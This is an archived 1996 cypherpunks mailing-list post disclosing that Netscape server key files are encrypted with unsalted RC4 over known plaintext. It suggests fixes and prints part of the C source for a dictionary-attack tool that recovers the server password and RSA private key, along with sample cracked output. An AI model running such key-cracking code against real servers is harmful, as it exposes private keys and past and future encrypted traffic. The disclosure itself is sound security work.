@@ -1,0 +1,1005 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: [Long] How to break Netscape's server key encryption -->
+<!--X-From-R13: cthg001Npf.nhpxynaq.np.am -->
+<!--X-Date: Thu, 26 Sep 1996 05:42:23 +0800 -->
+<!--X-Message-Id: 84366802803808@cs26.cs.auckland.ac.nz -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>[Long] How to break Netscape's server key encryption</TITLE>
+<LINK REV="made" HREF="mailto:pgut001@cs.auckland.ac.nz">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg02294.html">Date Prev</A>][<A HREF="msg02217.html">Date Next</A>][<A HREF="msg02294.html">Thread Prev</A>][<A HREF="msg02216.html">Thread Next</A>][<A HREF="index.html#02300">Date Index</A>][<A HREF="threads.html#02300">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>[Long] How to break Netscape's server key encryption</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: [Long] How to break Netscape's server key encryption</LI>
+<LI><em>From</em>: <A HREF="mailto:pgut001@cs.auckland.ac.nz">pgut001@cs.auckland.ac.nz</A></LI>
+<LI><em>Date</em>: Thu, 26 Sep 1996 04:13:48 (NZST)</LI>
+<LI><em>Reply-To</em>: <A HREF="mailto:pgut001@cs.auckland.ac.nz">pgut001@cs.auckland.ac.nz</A></LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+The Netscape server key format is very susceptible to both a dictionary attack
+and to keystream recovery.  It uses the PKCS #8 format for private keys, which
+provides a large amount of known plaintext at the start of the data, in
+combination with RC4 without any form of IV or other preprocessing (even though
+PKCS #8 recommends that PKCS #5 password-based encryption be used), which means
+you can recover the first 100-odd bytes of key stream with a simple XOR (the
+same stupid mistake Microsoft made with their .PWL files).  This means two
+things:
+
+1. It's very simple to write a program to perform a dictionary attack on the
+   server key (it took me about half an hour using cryptlib, and another half
+   hour to rip the appropriate code out of cryptlib to create a standalone
+   program).
+
+2. The recovered key stream from the encrypted server key can be used to
+   decrypt any other resource encrypted with the server password, *without
+   knowing the password*.  This is because there's enough known plaintext
+   (ASN.1 objects, object identifiers, and public key components) at the start
+   of the encrypted data to recover large quantities of key stream.
+
+To demonstrate the problem, I have written a program which performs a
+dictionary attack on the server key, and if successful prints the password used
+to encrypt it and the server's RSA private key.  Originally I used my
+encryption library (<A  HREF="http://www.cs.auckland.ac.nz/~pgut001/cryptlib.html">http://www.cs.auckland.ac.nz/~pgut001/cryptlib.html</A>) to do
+the encryption, to turn it into a standalone program I ripped the necessary
+parts out of the library, which means it's a bit messy and not as portable as
+the original was.  The code could probably be made to run about twice as fast
+if it's properly optimised, but I don't know if it's worth the bother and
+besides, it's just gone 4am I could use some sleep.
+
+To run it, use:
+
+  breaksk &lt;Netscape server key file&gt; &lt;word list file&gt;
+
+Here's the output from a server key someone sent me, tested against my 100MB+
+word list collection (some people collect stamps, I collect word lists :-):
+
+  The password used to encrypt this Netscape server key is 'unguessable'.
+
+  Modulus = 00D50626580C2543378FD249994A543FBF5FF1333E70684E942EC7034E5FA [...]
+  Public exponent = 03
+  Private exponent = 008E0419900818D77A5FE18666318D7FD4EAA0CCD44AF03462C9 [...]
+  Prime 1 = 00FBD3FC2CE1F50B31323F2D3FA27F6708D4373CC0487DB7199A712124380 [...]
+  Prime 2 = 00D88D984BA6A7CD07F6608D95D3AC2682769DA904D061E593CF86A21B4A9 [...]
+  Exponent 1 = 00A7E2A81DEBF8B220CC2A1E2A6C54EF5B3824D32ADAFE7A1111A0C0C2 [...]
+  Exponent 2 = 00905E6587C46FDE054EEB090E8D1D6F01A4691B588AEBEE628A59C167 [...]
+  Coefficient = 2DEBC012356B96D2206346141371D999288F55DD07AEF6D1972383E97 [...]
+
+(I've trimmed some of the lines a bit).
+
+The problem here is caused by a combination of the PKCS #8 format (which is
+rather nonoptimal for protecting private keys) and the use of RC4 to encryt
+fixed, known plaintext.  Since everything is constant, you don't even need to
+run the password-transformation process more than once - just store a
+dictionary of the resulting key stream for each password in a database, and you
+can break the encryption with a single lookup (this would be avoided by the use
+of PKCS #5 password-based encryption, which iterates the key setup and uses a
+salt to make a precomputed dictionary attack impossible.  PKCS #5 states that
+its primary intended application is for protecting private keys, but Netscape
+chose not to use this and went with straight RC4 instead).
+
+A quick (but not necessarily optimal) solution to the problem involves two
+changes:
+
+1. Only encrypt the unknown, private fields in the key (which is what PGP
+   does).  Instead of wrapping everything up in several layers of encapsulation
+   with object identifiers and public-key components, change the portion which
+   is encrypted to:
+
+      EncryptedRSAPrivateKey ::= SEQUENCE {
+        privateExponent INTEGER,
+        prime1          INTEGER,
+        prime2          INTEGER,
+        exponent1       INTEGER,
+        exponent2       INTEGER,
+        coefficient     INTEGER
+        }
+
+   with everything else outside this object.
+
+2. Don't use a simple stream cipher to encrypt fixed data like this.  Use an IV
+   on the encrypted data.  Iterate the password setup to slow down a dictionary
+   attack (I posted a scheme for transforming variable to fixed-length keys to
+   the cypherpunks list a few days ago which provides the necessary
+   functionality).
+
+The consequences of this attack are pretty scary.  It involves vastly less
+effort than breaking a 40-bit session key or factoring a 512-bit public key,
+yet once you've recovered the private key you can also recover every session
+key it's ever protected in the past and will ever protect in the future (which
+is why I'm a fan of signed DH for session key exchange).  The ease with which a
+dictionary attack can be carried out represents a critical weakness which
+compromises all other encryption components on the server - spending a few days
+with a Markov-model based phrase generator on a PC is still a lot easier than
+spending a few months with GNFS and a workstation farm.
+
+It seems strange that there are no real standards defined for secure storage of
+such a critical component as a private key.  Although a lot of work has gone
+into X.509 and the multitude of related public-key certificate standards, the
+only generally-used private-key formats are PKCS #8 (which has problems, as
+demonstrated above), and Microsofts recently-proposed PFX (Personal Information
+Exchange) data format and protocol (PFX is designed to allow users to move
+their keys, certificates and other personal information securely from one
+platform to another, you can get more info on it from
+<A  HREF="http://www.microsoft.com/intdev/security/misf11_7.htm">http://www.microsoft.com/intdev/security/misf11_7.htm</A>), which is too new to
+comment on.  It would be useful if a portable, secure private-key format at the
+same level as the X.509 effort were developed to solve this problem.
+
+For the curious (and ASN.1-aware), here's what the data formats look like.
+First there's the outer encapsulation which Netscape use to wrap up the
+encrypted key:
+
+  NetscapeServerKey ::= SEQUENCE {
+    identifier          OCTET STRING ('private-key'),
+    encryptedPrivateKeyInfo
+                        EncryptedPrivateKeyInfo
+    }
+
+Inside this is a PKCS #8 private key:
+
+  EncryptedPrivateKeyInfo ::= SEQUENCE {
+    encryptionAlgorithm EncryptionAlgorithmIdentifier,
+    encryptedData       EncryptedData
+    }
+
+  EncryptionAlgorithmIdentifier ::= AlgorithmIdentifier
+
+  EncryptedData = OCTET STRING
+
+Now the EncryptionAlgorithmIdentifier is supposed to be something like
+pbeWithMD5AndDES, with an associated 64-bit salt and iteration count, but
+Netscape ignored this and used straight rc4 with no salt or iteration count.
+The EncryptedData decrypts to:
+
+  PrivateKeyInfo ::= SEQUENCE {
+    version             Version
+    privateKeyAlgorithm PrivateKeyAlgorithmIdentifier
+    privateKey          PrivateKey
+    attributes    [ 0 ] IMPLICIT Attributes OPTIONAL
+    }
+
+  Version ::= INTEGER
+
+  PrivateKeyAlgorithmIdentifier ::= AlgorithmIdentifier
+
+  PrivateKey ::= OCTET STRING
+
+  Attributes ::= SET OF Attribute
+
+The algorithm information is encoded as:
+
+  AlgorithmIdentifier ::= SEQUENCE {
+    algorithm           ALGORITHM.&amp;id( { SupportedAlgorithms } ),
+    parameters          ALGORITHM.&amp;Type( { SupportedAlgorithms }{ @algorithm } )
+                            OPTIONAL
+    }
+
+  SupportedAlgorithms ALGORITHM ::= { ... }
+
+  ALGORITHM ::= TYPE-IDENTIFIER
+
+(and so on and so on, I haven't bothered going down any further).  The
+EncryptionAlgorithmIdentifier is '1 2 840 113549 3 4' or { iso(1)
+member-body(2) US(840) rsadsi(113549) algorithm(3) rc4(4) }.  The
+PrivateKeyAlgorithmIdentifier is '1 2 840 113549 1 1 1' or { iso(1)
+member-body(2) US(840) rsadsi(113549) pkcs(1) pkcs1-1(1) rsaEncryption(1) }.
+
+Included below is the code to perform the attack (set tabs to 4, phasers to
+stun).
+
+Do I get a t-shirt for this? :-)
+
+Peter.
+
+-- Snip --
+
+/* BreakSK - Break Netscape server key file encryption via dictionary attack.
+   Written by Peter Gutmann &lt;pgut001@cs.auckland.ac.nz&gt; 26 September 1996 */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+/* Most of the code here was ripped out of cryptlib and is somewhat messy as
+   a consquence.  cryptlib has fairly extensive self-configuration and an
+   internal API which hides machine-specific details, this program doesn't
+   (the code here really wasn't meant for standalone use).  As a result you
+   need to manually define LITTLE_ENDIAN or BIG_ENDIAN, and it won't work at
+   all on 64-bit systems.  If you want the portability, use cryptlib instead */
+
+#define LITTLE_ENDIAN
+/* #define BIG_ENDIAN */
+
+/* Workarounds for cryptlib defines, constants, and macros */
+
+#define MASK32(x)	x
+
+#define FALSE	0
+#define TRUE	!FALSE
+
+typedef unsigned char BYTE;
+typedef unsigned long LONG;
+typedef int BOOLEAN;
+
+/* Functions to convert the endianness from the canonical form to the
+   internal form.  bigToLittle() convert from big-endian in-memory to
+   little-endian in-CPU, littleToBig() convert from little-endian in-memory
+   to big-endian in-CPU */
+
+void longReverse( LONG *buffer, int count );
+
+#ifdef LITTLE_ENDIAN
+  #define bigToLittleLong( x, y )	longReverse(x,y)
+  #define littleToBigLong( x, y )
+#else
+  #define bigToLittleLong( x, y )
+  #define littleToBigLong( x, y )	longReverse(x,y)
+#endif /* LITTLE_ENDIAN */
+
+/* Byte-reverse an array of 16- and 32-bit words to/from network byte order
+   to account for processor endianness.  These routines assume the given
+   count is a multiple of 16 or 32 bits.  They are safe even for CPU's with
+   a word size &gt; 32 bits since on a little-endian CPU the important 32 bits
+   are stored first, so that by zeroizing the first 32 bits and oring the
+   reversed value back in we don't need to rely on the processor only writing
+   32 bits into memory */
+
+void longReverse( LONG *buffer, int count )
+	{
+#if defined( _BIG_WORDS )
+	BYTE *bufPtr = ( BYTE * ) buffer, temp;
+
+	count /= 4;		/* sizeof( LONG ) != 4 */
+	while( count-- )
+		{
+		/* There's really no nice way to do this - the above code generates
+		   misaligned accesses on processors with a word size &gt; 32 bits, so
+		   we have to work at the byte level (either that or turn misaligned
+		   access warnings off by trapping the signal the access corresponds
+		   to.  However a context switch per memory access is probably
+		   somewhat slower than the current byte-twiddling mess) */
+		temp = bufPtr[ 3 ];
+		bufPtr[ 3 ] = bufPtr[ 0 ];
+		bufPtr[ 0 ] = temp;
+		temp = bufPtr[ 2 ];
+		bufPtr[ 2 ] = bufPtr[ 1 ];
+		bufPtr[ 1 ] = temp;
+		bufPtr += 4;
+		}
+#else
+	LONG value;
+
+	count /= sizeof( LONG );
+	while( count-- )
+		{
+		value = *buffer;
+		value = ( ( value &amp; 0xFF00FF00UL ) &gt;&gt; 8  ) | \
+				( ( value &amp; 0x00FF00FFUL ) &lt;&lt; 8 );
+		*buffer++ = ( value &lt;&lt; 16 ) | ( value &gt;&gt; 16 );
+		}
+#endif /* _BIG_WORDS */
+	}
+
+#define mputLLong(memPtr,data)	\
+		memPtr[ 0 ] = ( BYTE ) ( ( data ) &amp; 0xFF ); \
+		memPtr[ 1 ] = ( BYTE ) ( ( ( data ) &gt;&gt; 8 ) &amp; 0xFF ); \
+		memPtr[ 2 ] = ( BYTE ) ( ( ( data ) &gt;&gt; 16 ) &amp; 0xFF ); \
+		memPtr[ 3 ] = ( BYTE ) ( ( ( data ) &gt;&gt; 24 ) &amp; 0xFF ); \
+		memPtr += 4
+
+/****************************************************************************
+*																			*
+*										MD5 								*
+*																			*
+****************************************************************************/
+
+/* The MD5 block size and message digest sizes, in bytes */
+
+#define MD5_DATASIZE	64
+#define MD5_DIGESTSIZE	16
+
+/* The structure for storing MD5 info */
+
+typedef struct {
+			   LONG digest[ 4 ];			/* Message digest */
+			   LONG countLo, countHi;		/* 64-bit bit count */
+			   LONG data[ 16 ];				/* MD5 data buffer */
+#ifdef _BIG_WORDS
+			   BYTE dataBuffer[ MD5_DATASIZE ];	/* Byte buffer for data */
+#endif /* _BIG_WORDS */
+			   BOOLEAN done;				/* Whether final digest present */
+			   } MD5_INFO;
+
+/* Round 1 shift amounts */
+
+#define S11	7
+#define S12	12
+#define S13	17
+#define S14	22
+
+/* Round 2 shift amounts */
+
+#define S21 5
+#define S22 9
+#define S23 14
+#define S24 20
+
+/* Round 3 shift amounts */
+
+#define S31 4
+#define S32 11
+#define S33 16
+#define S34 23
+
+/* Round 4 shift amounts */
+
+#define S41 6
+#define S42 10
+#define S43 15
+#define S44 21
+
+/* F, G, H and I are basic MD5 functions */
+
+#define F(X,Y,Z)	( ( X &amp; Y ) | ( ~X &amp; Z ) )
+#define G(X,Y,Z)	( ( X &amp; Z ) | ( Y &amp; ~Z ) )
+#define H(X,Y,Z)	( X ^ Y ^ Z )
+#define I(X,Y,Z)	( Y ^ ( X | ~Z ) )
+
+/* ROTATE_LEFT rotates x left n bits */
+
+#define ROTATE_LEFT(x,n)	( ( x &lt;&lt; n ) | ( x &gt;&gt; ( 32 - n ) ) )
+
+/* FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4 */
+
+#define FF(A,B,C,D,X,shiftAmt,magicConst) \
+	A += F( B, C, D ) + X + magicConst; \
+	A = MASK32( ROTATE_LEFT( MASK32( A ), shiftAmt ) + B )
+
+#define GG(A,B,C,D,X,shiftAmt,magicConst) \
+	A += G( B, C, D ) + X + magicConst; \
+	A = MASK32( ROTATE_LEFT( MASK32( A ), shiftAmt ) + B )
+
+#define HH(A,B,C,D,X,shiftAmt,magicConst) \
+	A += H( B, C, D ) + X + magicConst; \
+	A = MASK32( ROTATE_LEFT( MASK32( A ), shiftAmt ) + B )
+
+#define II(A,B,C,D,X,shiftAmt,magicConst) \
+	A += I( B, C, D ) + X + magicConst; \
+	A = MASK32( ROTATE_LEFT( MASK32( A ), shiftAmt ) + B )
+
+/* Basic MD5 step. Transforms digest based on data.  Note that if the
+   Mysterious Constants are arranged backwards in little-endian order and
+   decrypted with DES they produce OCCULT MESSAGES! */
+
+void MD5Transform( LONG *digest, LONG *data )
+	{
+	LONG A, B, C, D;
+
+	/* Set up local data */
+	A = digest[ 0 ];
+	B = digest[ 1 ];
+	C = digest[ 2 ];
+	D = digest[ 3 ];
+
+	/* Round 1 */
+	FF( A, B, C, D, data[  0 ], S11, 3614090360UL );	/*  1 */
+	FF( D, A, B, C, data[  1 ], S12, 3905402710UL );	/*  2 */
+	FF( C, D, A, B, data[  2 ], S13,  606105819UL );	/*  3 */
+	FF( B, C, D, A, data[  3 ], S14, 3250441966UL );	/*  4 */
+	FF( A, B, C, D, data[  4 ], S11, 4118548399UL );	/*  5 */
+	FF( D, A, B, C, data[  5 ], S12, 1200080426UL );	/*  6 */
+	FF( C, D, A, B, data[  6 ], S13, 2821735955UL );	/*  7 */
+	FF( B, C, D, A, data[  7 ], S14, 4249261313UL );	/*  8 */
+	FF( A, B, C, D, data[  8 ], S11, 1770035416UL );	/*  9 */
+	FF( D, A, B, C, data[  9 ], S12, 2336552879UL );	/* 10 */
+	FF( C, D, A, B, data[ 10 ], S13, 4294925233UL );	/* 11 */
+	FF( B, C, D, A, data[ 11 ], S14, 2304563134UL );	/* 12 */
+	FF( A, B, C, D, data[ 12 ], S11, 1804603682UL );	/* 13 */
+	FF( D, A, B, C, data[ 13 ], S12, 4254626195UL );	/* 14 */
+	FF( C, D, A, B, data[ 14 ], S13, 2792965006UL );	/* 15 */
+	FF( B, C, D, A, data[ 15 ], S14, 1236535329UL );	/* 16 */
+
+	/* Round 2 */
+	GG( A, B, C, D, data[  1 ], S21, 4129170786UL );	/* 17 */
+	GG( D, A, B, C, data[  6 ], S22, 3225465664UL );	/* 18 */
+	GG( C, D, A, B, data[ 11 ], S23,  643717713UL );	/* 19 */
+	GG( B, C, D, A, data[  0 ], S24, 3921069994UL );	/* 20 */
+	GG( A, B, C, D, data[  5 ], S21, 3593408605UL );	/* 21 */
+	GG( D, A, B, C, data[ 10 ], S22,   38016083UL );	/* 22 */
+	GG( C, D, A, B, data[ 15 ], S23, 3634488961UL );	/* 23 */
+	GG( B, C, D, A, data[  4 ], S24, 3889429448UL );	/* 24 */
+	GG( A, B, C, D, data[  9 ], S21,  568446438UL );	/* 25 */
+	GG( D, A, B, C, data[ 14 ], S22, 3275163606UL );	/* 26 */
+	GG( C, D, A, B, data[  3 ], S23, 4107603335UL );	/* 27 */
+	GG( B, C, D, A, data[  8 ], S24, 1163531501UL );	/* 28 */
+	GG( A, B, C, D, data[ 13 ], S21, 2850285829UL );	/* 29 */
+	GG( D, A, B, C, data[  2 ], S22, 4243563512UL );	/* 30 */
+	GG( C, D, A, B, data[  7 ], S23, 1735328473UL );	/* 31 */
+	GG( B, C, D, A, data[ 12 ], S24, 2368359562UL );	/* 32 */
+
+	/* Round 3 */
+	HH( A, B, C, D, data[  5 ], S31, 4294588738UL );	/* 33 */
+	HH( D, A, B, C, data[  8 ], S32, 2272392833UL );	/* 34 */
+	HH( C, D, A, B, data[ 11 ], S33, 1839030562UL );	/* 35 */
+	HH( B, C, D, A, data[ 14 ], S34, 4259657740UL );	/* 36 */
+	HH( A, B, C, D, data[  1 ], S31, 2763975236UL );	/* 37 */
+	HH( D, A, B, C, data[  4 ], S32, 1272893353UL );	/* 38 */
+	HH( C, D, A, B, data[  7 ], S33, 4139469664UL );	/* 39 */
+	HH( B, C, D, A, data[ 10 ], S34, 3200236656UL );	/* 40 */
+	HH( A, B, C, D, data[ 13 ], S31,  681279174UL );	/* 41 */
+	HH( D, A, B, C, data[  0 ], S32, 3936430074UL );	/* 42 */
+	HH( C, D, A, B, data[  3 ], S33, 3572445317UL );	/* 43 */
+	HH( B, C, D, A, data[  6 ], S34,   76029189UL );	/* 44 */
+	HH( A, B, C, D, data[  9 ], S31, 3654602809UL );	/* 45 */
+	HH( D, A, B, C, data[ 12 ], S32, 3873151461UL );	/* 46 */
+	HH( C, D, A, B, data[ 15 ], S33,  530742520UL );	/* 47 */
+	HH( B, C, D, A, data[  2 ], S34, 3299628645UL );	/* 48 */
+
+	/* Round 4 */
+	II( A, B, C, D, data[  0 ], S41, 4096336452UL );	/* 49 */
+	II( D, A, B, C, data[  7 ], S42, 1126891415UL );	/* 50 */
+	II( C, D, A, B, data[ 14 ], S43, 2878612391UL );	/* 51 */
+	II( B, C, D, A, data[  5 ], S44, 4237533241UL );	/* 52 */
+	II( A, B, C, D, data[ 12 ], S41, 1700485571UL );	/* 53 */
+	II( D, A, B, C, data[  3 ], S42, 2399980690UL );	/* 54 */
+	II( C, D, A, B, data[ 10 ], S43, 4293915773UL );	/* 55 */
+	II( B, C, D, A, data[  1 ], S44, 2240044497UL );	/* 56 */
+	II( A, B, C, D, data[  8 ], S41, 1873313359UL );	/* 57 */
+	II( D, A, B, C, data[ 15 ], S42, 4264355552UL );	/* 58 */
+	II( C, D, A, B, data[  6 ], S43, 2734768916UL );	/* 59 */
+	II( B, C, D, A, data[ 13 ], S44, 1309151649UL );	/* 60 */
+	II( A, B, C, D, data[  4 ], S41, 4149444226UL );	/* 61 */
+	II( D, A, B, C, data[ 11 ], S42, 3174756917UL );	/* 62 */
+	II( C, D, A, B, data[  2 ], S43,  718787259UL );	/* 63 */
+	II( B, C, D, A, data[  9 ], S44, 3951481745UL );	/* 64 */
+
+	/* Build message digest */
+	digest[ 0 ] = MASK32( digest[ 0 ] + A );
+	digest[ 1 ] = MASK32( digest[ 1 ] + B );
+	digest[ 2 ] = MASK32( digest[ 2 ] + C );
+	digest[ 3 ] = MASK32( digest[ 3 ] + D );
+	}
+
+/****************************************************************************
+*																			*
+*							MD5 Support Routines							*
+*																			*
+****************************************************************************/
+
+/* The routine md5Initial initializes the message-digest context md5Info */
+
+void md5Initial( MD5_INFO *md5Info )
+	{
+	/* Clear all fields */
+	memset( md5Info, 0, sizeof( MD5_INFO ) );
+
+	/* Load magic initialization constants */
+	md5Info-&gt;digest[ 0 ] = 0x67452301L;
+	md5Info-&gt;digest[ 1 ] = 0xEFCDAB89L;
+	md5Info-&gt;digest[ 2 ] = 0x98BADCFEL;
+	md5Info-&gt;digest[ 3 ] = 0x10325476L;
+
+	/* Initialise bit count */
+	md5Info-&gt;countLo = md5Info-&gt;countHi = 0L;
+	}
+
+/* The routine MD5Update updates the message-digest context to account for
+   the presence of each of the characters buffer[ 0 .. count-1 ] in the
+   message whose digest is being computed */
+
+void md5Update( MD5_INFO *md5Info, BYTE *buffer, int count )
+	{
+	LONG tmp;
+	int dataCount;
+
+	/* Update bitcount */
+	tmp = md5Info-&gt;countLo;
+	if ( ( md5Info-&gt;countLo = tmp + ( ( LONG ) count &lt;&lt; 3 ) ) &lt; tmp )
+		md5Info-&gt;countHi++;				/* Carry from low to high */
+	md5Info-&gt;countHi += count &gt;&gt; 29;
+
+	/* Get count of bytes already in data */
+	dataCount = ( int ) ( tmp &gt;&gt; 3 ) &amp; 0x3F;
+
+	/* Handle any leading odd-sized chunks */
+	if( dataCount )
+		{
+#ifdef _BIG_WORDS
+		BYTE *p = md5Info-&gt;dataBuffer + dataCount;
+#else
+		BYTE *p = ( BYTE * ) md5Info-&gt;data + dataCount;
+#endif /* _BIG_WORDS */
+
+		dataCount = MD5_DATASIZE - dataCount;
+		if( count &lt; dataCount )
+			{
+			memcpy( p, buffer, count );
+			return;
+			}
+		memcpy( p, buffer, dataCount );
+#ifdef _BIG_WORDS
+		copyToLLong( md5Info-&gt;data, md5Info-&gt;dataBuffer, MD5_DATASIZE );
+#else
+		littleToBigLong( md5Info-&gt;data, MD5_DATASIZE );
+#endif /* _BIG_WORDS */
+		MD5Transform( md5Info-&gt;digest, md5Info-&gt;data );
+		buffer += dataCount;
+		count -= dataCount;
+		}
+
+	/* Process data in MD5_DATASIZE chunks */
+	while( count &gt;= MD5_DATASIZE )
+		{
+#ifdef _BIG_WORDS
+		memcpy( md5Info-&gt;dataBuffer, buffer, MD5_DATASIZE );
+		copyToLLong( md5Info-&gt;data, md5Info-&gt;dataBuffer, MD5_DATASIZE );
+#else
+		memcpy( md5Info-&gt;data, buffer, MD5_DATASIZE );
+		littleToBigLong( md5Info-&gt;data, MD5_DATASIZE );
+#endif /* _BIG_WORDS */
+		MD5Transform( md5Info-&gt;digest, md5Info-&gt;data );
+		buffer += MD5_DATASIZE;
+		count -= MD5_DATASIZE;
+		}
+
+	/* Handle any remaining bytes of data. */
+#ifdef _BIG_WORDS
+	memcpy( md5Info-&gt;dataBuffer, buffer, count );
+#else
+	memcpy( md5Info-&gt;data, buffer, count );
+#endif /* _BIG_WORDS */
+	}
+
+/* Final wrapup - pad to MD5_DATASIZE-byte boundary with the bit pattern
+   1 0* (64-bit count of bits processed, MSB-first) */
+
+void md5Final( MD5_INFO *md5Info )
+	{
+	int count;
+	BYTE *dataPtr;
+
+	/* Compute number of bytes mod 64 */
+	count = ( int ) md5Info-&gt;countLo;
+	count = ( count &gt;&gt; 3 ) &amp; 0x3F;
+
+	/* Set the first char of padding to 0x80.  This is safe since there is
+	   always at least one byte free */
+#ifdef _BIG_WORDS
+	dataPtr = md5Info-&gt;dataBuffer + count;
+#else
+	dataPtr = ( BYTE * ) md5Info-&gt;data + count;
+#endif /* _BIG_WORDS */
+	*dataPtr++ = 0x80;
+
+	/* Bytes of padding needed to make 64 bytes */
+	count = MD5_DATASIZE - 1 - count;
+
+	/* Pad out to 56 mod 64 */
+	if( count &lt; 8 )
+		{
+		/* Two lots of padding:  Pad the first block to 64 bytes */
+		memset( dataPtr, 0, count );
+#ifdef _BIG_WORDS
+		copyToLLong( md5Info-&gt;data, md5Info-&gt;dataBuffer, MD5_DATASIZE );
+#else
+		littleToBigLong( md5Info-&gt;data, MD5_DATASIZE );
+#endif /* _BIG_WORDS */
+		MD5Transform( md5Info-&gt;digest, md5Info-&gt;data );
+
+		/* Now fill the next block with 56 bytes */
+#ifdef _BIG_WORDS
+		memset( md5Info-&gt;dataBuffer, 0, MD5_DATASIZE - 8 );
+#else
+		memset( md5Info-&gt;data, 0, MD5_DATASIZE - 8 );
+#endif /* _BIG_WORDS */
+		}
+	else
+		/* Pad block to 56 bytes */
+		memset( dataPtr, 0, count - 8 );
+#ifdef _BIG_WORDS
+	copyToLLong( md5Info-&gt;data, md5Info-&gt;dataBuffer, MD5_DATASIZE );
+#endif /* _BIG_WORDS */
+
+	/* Append length in bits and transform */
+	md5Info-&gt;data[ 14 ] = md5Info-&gt;countLo;
+	md5Info-&gt;data[ 15 ] = md5Info-&gt;countHi;
+
+#ifndef _BIG_WORDS
+	littleToBigLong( md5Info-&gt;data, MD5_DATASIZE - 8 );
+#endif /* _BIG_WORDS */
+	MD5Transform( md5Info-&gt;digest, md5Info-&gt;data );
+
+	md5Info-&gt;done = TRUE;
+	}
+
+/****************************************************************************
+*																			*
+*										RC4 								*
+*																			*
+****************************************************************************/
+
+/* If the system can handle byte ops, we use those so we don't have to do a
+   lot of masking.  Otherwise, we use machine-word-size ops which will be
+   faster on RISC machines */
+
+#if UINT_MAX &gt; 0xFFFFL		/* System has 32-bit ints */
+  #define USE_LONG_RC4
+
+  typedef unsigned int rc4word;
+#else
+  typedef unsigned char rc4word;
+#endif /* UINT_MAX &gt; 0xFFFFL */
+
+/* The scheduled RC4 key */
+
+typedef struct {
+	rc4word state[ 256 ];
+	rc4word x, y;
+	} RC4KEY ;
+
+/* Expand an RC4 key */
+
+void rc4ExpandKey( RC4KEY *rc4, unsigned char const *key, int keylen )
+	{
+	int x, keypos = 0;
+	rc4word sx, y = 0;
+	rc4word *state = &amp;rc4-&gt;state[ 0 ];
+
+	rc4-&gt;x = rc4-&gt;y = 0;
+
+	for( x = 0; x &lt; 256; x++ )
+		state[ x ] = x;
+
+	for( x = 0; x &lt; 256; x++ )
+		{
+		sx = state[ x ];
+		y += sx + key[ keypos ];
+#ifdef USE_LONG_RC4
+		y &amp;= 0xFF;
+#endif /* USE_LONG_RC4 */
+		state[ x ] = state[ y ];
+		state[ y ] = sx;
+
+		if( ++keypos == keylen )
+			keypos = 0;
+		}
+	}
+
+void rc4Crypt( RC4KEY *rc4, unsigned char *data, int len )
+{
+	rc4word x = rc4-&gt;x, y = rc4-&gt;y;
+	rc4word sx, sy;
+	rc4word *state = &amp;rc4-&gt;state[ 0 ];
+
+	while (len--) {
+		x++;
+#ifdef USE_LONG_RC4
+		x &amp;= 0xFF;
+#endif /* USE_LONG_RC4 */
+		sx = state[ x ];
+		y += sx;
+#ifdef USE_LONG_RC4
+		y &amp;= 0xFF;
+#endif /* USE_LONG_RC4 */
+		sy = state[ y ];
+		state[ y ] = sx;
+		state[ x ] = sy;
+
+#ifdef USE_LONG_RC4
+		*data++ ^= state[ ( unsigned char ) ( sx+sy ) ];
+#else
+		*data++ ^= state[ ( sx+sy ) &amp; 0xFF ];
+#endif /* USE_LONG_RC4 */
+	}
+
+	rc4-&gt;x = x;
+	rc4-&gt;y = y;
+}
+
+/****************************************************************************
+*																			*
+*									Driver Code 							*
+*																			*
+****************************************************************************/
+
+/* Various magic values in the key file */
+
+static BYTE netscapeKeyfileID[] = {
+	0x04, 0x0B, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74,
+	0x65, 0x2D, 0x6B, 0x65, 0x79
+	};
+static BYTE rc4EncryptionID[] = {
+	0x30, 0x0C, 0x06, 0x08, 0x2A, 0x86, 0x48, 0x86,
+	0xF7, 0x0D, 0x03, 0x04, 0x05, 0x00
+	};
+static BYTE version[] = {
+	0x02, 0x01, 0x00
+	};
+static BYTE rsaPrivateKeyID[] = {
+	0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86,
+	0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00
+	};
+
+/* General-purpose buffer.  We make them static buffers to keep them off the
+   stack on DOS/Win16 boxes */
+
+static BYTE buffer[ 1024 ], temp[ 1024 ];
+
+/* Print a key component */
+
+int printKeyComponent( BYTE *buffer, char *title )
+	{
+	int count, length = 0, totalLength = 2;
+
+	printf( "%s = ", title );
+	if( *buffer++ != 0x02 )
+		{
+		puts( "Bad data format in key component." );
+		return( 0 );
+		}
+
+	/* Get the length of the component */
+	if( *buffer &amp; 0x80 )
+		{
+		count = *buffer++ &amp; 0x7F;
+		totalLength += count;
+		while( count-- )
+			length = ( length &lt;&lt; 8 ) | *buffer++;
+		}
+	else
+		length = *buffer++;
+	totalLength += length;
+
+	/* Print the data */
+	for( count = 0; count &lt; length; count++ )
+		printf( "%02X", buffer[ count ] );
+	putchar( '\n' );
+
+	return( totalLength );
+	}
+
+/* The main program */
+
+int main( int argc, char *argv[] )
+	{
+	FILE *keyFile, *dictFile;
+	int count, length = 0;
+
+	/* Check args and open the server key file */
+	if( argc != 3 )
+		{
+		puts( "Usage: breaksk &lt;server key file&gt; &lt;dictionary&gt;" );
+		return( EXIT_FAILURE );
+		}
